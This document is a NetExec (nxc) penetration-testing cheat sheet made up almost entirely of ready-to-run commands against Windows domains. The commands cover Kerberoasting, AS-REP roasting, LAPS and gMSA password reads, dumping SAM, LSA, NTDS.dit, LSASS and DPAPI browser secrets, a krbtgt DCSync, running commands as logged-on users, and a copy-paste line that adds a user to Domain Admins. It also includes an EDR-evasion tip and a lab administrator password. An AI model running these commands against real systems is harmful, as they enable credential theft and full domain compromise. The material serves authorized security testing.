# NetExec

NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of *large* networks

![Untitled](https://fzl-aws.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F68ca7968-174f-4df4-ab04-3d91b871155c%2F19f4e3f7-b83b-4304-8517-e85500a7ad64%2FUntitled.png?table=block&id=5bd1b66d-16fc-490e-9b9f-672233618e40&spaceId=68ca7968-174f-4df4-ab04-3d91b871155c&width=2000&userId=&cache=v2)

NetExec can exploit multiple protocols like :

```bash
protocols:
  available protocols

  {smb,ssh,ldap,ftp,wmi,winrm,rdp,vnc,mssql}
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    ldap                own stuff using LDAP
    ftp                 own stuff using FTP
    wmi                 own stuff using WMI
    winrm               own stuff using WINRM
    rdp                 own stuff using RDP
    vnc                 own stuff using VNC
    mssql               own stuff using MSSQL
```

### Install

```python
apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

or use the static binaries from here

[Untitled Database](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%20Database%20c0c8952a3f9f4fbfb7793866c38d697b.csv)

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%201.png)

## ASREP-Roasting

- without password

```python
❯ nxc ldap 10.10.10.192 -u users.txt -p '' --asreproast output.txt
```

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%202.png)

- with password

```python
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost oscp.local
```

## Kerberoasting

```python
❯ nxc ldap 10.10.10.100 -u svc_tgs -p GPPstillStandingStrong2k18 --kerberoasting output.txt
```

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%203.png)

# **Dump gMSA**

Extract gmsa credentials accounts

Using the protocol LDAP you can extract the password of a gMSA account if you have the right.

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%204.png)

```python
$ nxc ldap <ip> -u <user> -p <pass> --gmsa
```

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%205.png)

# BloodHound Ingestor

```python
❯ nxc ldap <ip> -u user -p pass --bloodhound -ns <ns-ip> --collection All
```

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%206.png)

# **Defeating LAPS**

**Using NetExec when LAPS installed on the domain**

If LAPS is used inside the domain, is can be hard to use NetExec to execute a command on every

computer on the domain.

Therefore, a new core option has been added `--laps !` If you have compromised an accout that can read LAPS password you can use NetExec like this

in this case , we can see our user can read Laps password.

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%207.png)

now let’s use `nxc`  to do this attack

```bash
❯ nxc winrm <IP> -u username -p 'password' --laps
```

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%208.png)

okay that’s our LAPS password. 

### Manual Way to Read Laps Password

```bash
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%209.png)

now let’s try to connect as administrator with that password & see if it works or not

```bash
❯ evil-winrm -i timelapse.htb -S -u administrator -p 'q.p+T{80W7t4Er#jzl]OcI6O'
```

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%2010.png)

bingo!! it works :D 

### Dumping All Files from SMB

```python
❯ nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
```

# **Get and Put Files**

## Send a File to the Remote Target

Send a local file to the remote target

```bash
nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
```

## Get a File From the Remote Target

Get a remote file on the remote target

```bash
nxc smb 172.16.251.152 -u user -p pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
```

## **Checking for Spooler & WebDav**

Checking if the Spooler Service is Running

```bash
nxc smb <ip> -u 'user' -p 'pass' -M spooler
```

Checking if the WebDav Service is Running

```bash
nxc smb <ip> -u 'user' -p 'pass' -M webdav
```

# **Impersonate logged-on Users**

Use Sessions from logged-on Users to execute arbitrary commands using `schtask_as` 

> **You need at least local admin privilege on the remote target**
> 

The Module `schtask_as` can execute commands on behalf on other users which has sessions on the target

Attack Vector :

1. Enumerate logged-on users on your Target

```bash
nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users
```

2. Execute commands on behalf of other users

```bash
nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
```

![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%2011.png)

Custom command to add an user to the domain admin group for easy copy & pasting:

```powershell
powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
```

# **Steal Microsoft Teams Cookies**

> **You need at least local admin privilege on the remote target**
> 

New NetExec module to dump Microsoft Teams cookies. You can use them to retrieve information like users, messages, groups etc or send directly messages in Teams.

```bash
$ nxc smb <ip> -u user -p pass -M teams_localdb
```

# **Obtaining Credentials**

**Dump SAM**

> You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
> 

```bash
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

**Dump LSA**

> Requires Domain Admin or Local Admin Priviledges on target Domain Controller
> 

```bash
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

**Dump NTDS.dit**

> Requires Domain Admin or Local Admin Priviledges on target Domain Controller
> 

```bash
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

> You can also DCSYNC with the computer account of the DC
> 

There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with [secretsdump.py](http://secretsdump.py/)

```bash
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M ntdsutil
```

**Dump LSASS**

> You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
> 

Using `Lsassy` 

```bash
nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
```

Using `nanodump` 

```bash
nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
```

using `MimiKatz` 

```bash
nxc smb 192.168.255.131 -u administrator -p pass -M mimikatz

nxc smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
```

**Dump KeePass**

```bash
$ NetExec smb <ip> -u user -p pass -M keepass_discover
$ NetExec smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
```

**Dump DPAPI**

you can dump all secrets from Credential Manager, Chrome, Edge, Firefox

> You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
> 
- cookies : Collect every cookies in browsers
- nosystem : Won't collect system credentials. This will prevent EDR from stopping you from looting passwords 🔥

```bash
$ nxc smb <ip> -u user -p password --dpapi
$ nxc smb <ip> -u user -p password --dpapi cookies
$ nxc smb <ip> -u user -p password --dpapi nosystem
```

**Dump WIFI password**

Get the WIFI password register in Windows

> You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
> 

```bash
nxc smb <ip> -u user -p pass -M wireless
```

### **Extract gMSA Secrets**

Convert gSAM id, convert gmsa lsa to ntlm 
NetExec offer multiple choices when you found a gmsa account in the LSA

```bash
nxc ldap <ip> -u <user> -p <pass> --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724

nxc ldap <ip> -u <user> -p <pass> --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000'
```

# **Scan for Vulnerabilities**

When you start your internal pentest, these are the first modules you should try:

**ZeroLogon**

```bash
nxc smb <ip> -u '' -p '' -M zerologon
```

**PetitPotam**

```bash
nxc smb <ip> -u '' -p '' -M petitpotam
```

**noPAC**

> You need a credential for this one
> 

```bash
nxc smb <ip> -u 'user' -p 'pass' -M nopac
```